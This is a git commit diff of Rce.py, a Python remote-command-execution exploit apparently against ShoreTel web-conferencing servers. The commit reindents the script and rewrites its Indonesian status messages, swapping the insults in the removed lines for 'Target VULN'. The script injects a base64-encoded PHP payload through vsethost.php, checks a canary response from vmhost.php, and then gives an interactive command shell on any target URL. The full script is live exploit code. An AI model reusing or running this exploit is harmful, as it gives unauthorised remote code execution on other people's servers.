9bac44a679101149cfc9e61caaf36c88a4b4f399
Garuda Tersakti 72 <41049681+GarudaTersakti72@users.noreply.github.com>
2019-08-15 22:19:19 +0700

    Update Rce.py

--- Rce.py
+++ Rce.py
@@ -1,28 +1,28 @@
 import base64, requests, sys
 import readline
 def build_shoretel(cmd):
-        obj = {
-                "hostId": "system",
-                "keyCode": "base64_decode",
-                "meetingType": "{${gKeyCode}($gSessionDir)}",
-                "sessionDir": base64.b64encode(bytes(cmd, "utf-8")).decode("ascii"),
-                "swfServer": "{${gHostID}($gMeetingType)}",
-                "server": "exec",
-                "dir": "/usr/share/apache2/htdocs/wc2_deploy/scripts/"
-        }
-        return obj
+	obj = {
+		"hostId": "system",
+		"keyCode": "base64_decode",
+		"meetingType": "{${gKeyCode}($gSessionDir)}",
+		"sessionDir": base64.b64encode(bytes(cmd, "utf-8")).decode("ascii"),
+		"swfServer": "{${gHostID}($gMeetingType)}",
+		"server": "exec",
+		"dir": "/usr/share/apache2/htdocs/wc2_deploy/scripts/"
+	}
+	return obj
 
 def exploit():
-        if len(sys.argv) < 2: sys.exit("Penggunaan: python rce.py https://targetlu.co.li")
-        url = sys.argv[1]
-        c = requests.get(url+"/scripts/vsethost.php",params = build_shoretel("echo bWVua3JlcDEzMzcK">
-        if requests.get(url+"/scripts/vmhost.php").text.strip() == "bWVua3JlcDEzMzcK":
-                print("Target PULEN BABI..!!!")
-                while True:
-                        cmd = input("CMD: ~$ ")
-                        requests.get(url+"/scripts/vsethost.php", params = build_shoretel(cmd))
-                        c = requests.get(url+"/scripts/vmhost.php")
-                        print(c.text if c.text != "" else "No output")
-        else:
-                print("TargetNya Gk PULEN Goblok..!!")
+	if len(sys.argv) < 2: sys.exit("Penggunaan: python rce.py https://targetlu.co.li")
+	url = sys.argv[1]
+	c = requests.get(url+"/scripts/vsethost.php",params = build_shoretel("echo bWVua3JlcDEzMzcK"))
+	if requests.get(url+"/scripts/vmhost.php").text.strip() == "bWVua3JlcDEzMzcK":
+		print("Target VULN..!!!")
+		while True:
+			cmd = input("CMD: ~$ ")
+			requests.get(url+"/scripts/vsethost.php", params = build_shoretel(cmd))
+			c = requests.get(url+"/scripts/vmhost.php")
+			print(c.text if c.text != "" else "No output")
+	else:
+		print("Target tidak VULN..!!")
 exploit()
